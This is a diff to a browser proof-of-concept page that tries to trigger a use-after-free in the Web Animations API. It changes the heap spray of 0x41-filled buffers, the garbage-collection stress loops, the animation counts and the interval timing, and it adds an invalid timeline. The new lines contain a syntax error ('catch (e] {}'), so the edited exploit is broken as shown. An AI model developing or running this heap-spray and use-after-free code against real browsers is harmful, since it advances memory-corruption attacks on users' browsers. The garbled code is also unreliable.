@@ -2,23 +2,23 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Animation UAF PoC</title>
+    <title>Animation UAF PoC v2</title>
 </head>
 <body>
     <div id="target"></div>
     <script>
         function stressGC() {
-            for (let i = 0; i < 2000; i++) {
+            for (let i = 0; i < 1500; i++) {
                 new ArrayBuffer(1024 * 1024);
             }
-            for (let i = 0; i < 300; i++) {
+            for (let i = 0; i < 200; i++) {
                 new ArrayBuffer(2 * 1024 * 1024);
             }
         }
 
         // Heap spray
         const spray = [];
-        for (let i = 0; i < 2000; i++) {
+        for (let i = 0; i < 1500; i++) {
             const buf = new Uint8Array(1024 * 1024);
             buf.fill(0x41);
             spray.push(buf);
@@ -28,7 +28,7 @@
         const target = document.getElementById('target');
         const keyframes = { transform: ['translateX(0)', 'translateX(100px)'] };
         const animations = [];
-        for (let i = 0; i < 50; i++) {
+        for (let i = 0; i < 100; i++) {
             const effect = new KeyframeEffect(target, keyframes, { duration: 1000 });
             animations.push(new Animation(effect, document.timeline));
         }
@@ -36,7 +36,12 @@
         try {
             const invalidEffect = new KeyframeEffect(target, null, { duration: 0 });
             animations.push(new Animation(invalidEffect, document.timeline));
-        } catch (e) {}
+        } catch (e] {}
+        // Add invalid timeline
+        try {
+            const invalidTimeline = { currentTime: null };
+            animations.push(new Animation(new KeyframeEffect(target, keyframes, { duration: 1000 }), invalidTimeline));
+        } catch (e] {}
 
         // Trigger UAF
         setInterval(() => {
@@ -47,7 +52,7 @@
             });
             target.replaceChildren('test');
             stressGC();
-        }, 5);
+        }, 2);
     </script>
 </body>
 </html>
